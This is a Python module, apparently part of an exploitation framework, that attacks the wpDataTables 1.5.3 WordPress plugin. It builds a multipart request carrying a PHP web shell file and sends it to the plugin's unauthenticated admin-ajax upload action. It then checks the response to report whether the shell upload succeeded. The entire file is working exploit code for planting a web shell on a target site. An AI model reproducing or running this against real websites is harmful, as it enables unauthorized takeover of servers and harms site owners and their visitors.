import http.client
import urllib.request
from ..exploitshell import ExploitShell


class WPDataTables(ExploitShell):
	@staticmethod
	def getname():
		return "wpDataTables"

	@staticmethod
	def getversion():
		return '1.5.3'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35341/'

	@staticmethod
	def getexploit():
		payloadname = 'extras/shell.php'
		payloadcontent = open(payloadname).read()

		limit = '----------lImIt_of_THE_fIle_eW_$'
		crlf = '\r\n'

		body = []

		body.append('--' + limit)
		body.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
		body.append('Content-Type: application/force-download')
		body.append('')
		body.append(payloadcontent)
		body.append('--' + limit + '--')
		body.append('')

		return crlf.join(body).encode('utf-8')

	def exploit(self):
		hostname = self.hostname
		name = self.getname()
		version = self.getversion()
		exploit = self.getexploit()
		if hostname[:8] != "https://" and hostname[:7] != "http://":
			hostname = 'http://' + hostname

		url = hostname + '/wp-admin/admin-ajax.php?action=wdt_upload_file'

		content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
			'Chrome/36.0.1985.125 Safari/537.36',
			'content-type': content_type,
			'content-length': str(len(exploit))}

		try:
			req = urllib.request.Request(url, exploit, headers)
			response = urllib.request.urlopen(req)
			read = response.read().decode("iso-8859-1")

			if "error" in read or read == '0':
				ExploitShell.exploitnotfound(self, name, version)
			else:
				ExploitShell.exploitfound(self, name, version, self.getexploiturl())
		except http.client.BadStatusLine:
				ExploitShell.exploitnotfound(self, name, version)
		except urllib.request.HTTPError:
				ExploitShell.exploitnotfound(self, name, version)
		except urllib.request.URLError:
				ExploitShell.exploitnotfound(self, name, version)

